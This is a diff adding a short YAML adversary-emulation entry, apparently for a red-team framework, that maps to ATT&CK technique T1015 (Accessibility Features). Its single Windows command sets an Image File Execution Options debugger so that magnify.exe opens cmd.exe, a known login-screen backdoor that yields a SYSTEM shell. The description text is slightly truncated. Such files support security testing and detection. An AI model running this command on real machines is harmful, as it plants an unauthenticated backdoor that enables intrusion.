@@ -1,0 +1,14 @@
+---
+
+- id: tacmulti-1015-AR03-1v00-200121075646
+  name: Attaches Command Prompt As Debugger To Process - magnify
+  description: .      This allows adversaries to execute the attached process.  
+  tactic: multiple
+  technique:
+    attack_id: T1015
+    name: Accessibility Features
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
